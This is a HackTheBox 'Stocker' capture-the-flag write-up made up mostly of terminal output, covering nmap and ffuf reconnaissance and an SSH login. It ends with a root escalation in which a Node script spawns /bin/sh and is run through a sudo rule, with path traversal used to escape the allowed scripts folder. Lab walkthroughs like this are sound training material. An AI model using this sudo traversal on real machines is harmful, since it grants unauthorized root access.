# HackTheBox Stocker WriteUp

> 原文: https://www.ctfiot.com/122470.html
> ID: 122470


```
┌──(kali㉿kali)-[~/Desktop/Stocker]
└─$ sudo nmap -Pn -n -v --reason -sS -p- -sC --min-rate=1000 -A 10.10.11.196 -oN nmap.log

PORT STATE SERVICE REASON VERSION
22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 3072 3d12971d86bc161683608f4f06e6d54e (RSA)
| 256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)
|_ 256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)
80/tcp open http syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://stocker.htb
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
┌──(kali㉿kali)-[~/Desktop/Stocker]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.stocker.htb" -u http://10.10.11.196 -fs 178

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/ '

 v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method : GET
 :: URL : http://10.10.11.196
 :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt
 :: Header : Host: FUZZ.stocker.htb
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 40
 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter : Response size: 178
________________________________________________

dev [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 164ms]
:: Progress: [151265/151265] :: Job [1/1] :: 259 req/sec :: Duration: [0:09:42] :: Errors: 0 ::
┌──(kali㉿kali)-[~/Desktop/Stocker]
└─$ ssh angoose@10.10.11.196
angoose@10.10.11.196s password:

angoose@stocker:~$ whoami
angoose
angoose@stocker:~$ ls -l
total 4
-rw-r----- 1 root angoose 33 Jun 24 09:29 user.txt
angoose@stocker:~$ sudo -l
[sudo] password for angoose:
Matching Defaults entries for angoose on stocker:
 env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
 (ALL) /usr/bin/node /usr/local/scripts/*.js
angoose@stocker:~$ ls -l /usr/local
total 36
drwxr-xr-x 2 root root 4096 Dec 6 2022 bin
drwxr-xr-x 2 root root 4096 Dec 6 2022 etc
drwxr-xr-x 2 root root 4096 Dec 6 2022 games
drwxr-xr-x 2 root root 4096 Dec 6 2022 include
drwxr-xr-x 3 root root 4096 Dec 6 2022 lib
lrwxrwxrwx 1 root root 9 Nov 19 2022 man -> share/man
drwxr-xr-x 2 root root 4096 Dec 23 2022 sbin
drwxr-xr-x 3 root root 4096 Dec 6 2022 scripts
drwxr-xr-x 5 root root 4096 Dec 6 2022 share
drwxr-xr-x 2 root root 4096 Dec 6 2022 src
(ALL) /usr/bin/node /usr/local/scripts/*.js
angoose@stocker:~$ cat exploit.js
require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})
angoose@stocker:~$ sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/exploit.js
root@stocker:/home/angoose
# whoami
root
root@stocker:~# ls -l
total 4
-rw-r----- 1 root root 33 Jun 24 09:29 root.txt
```
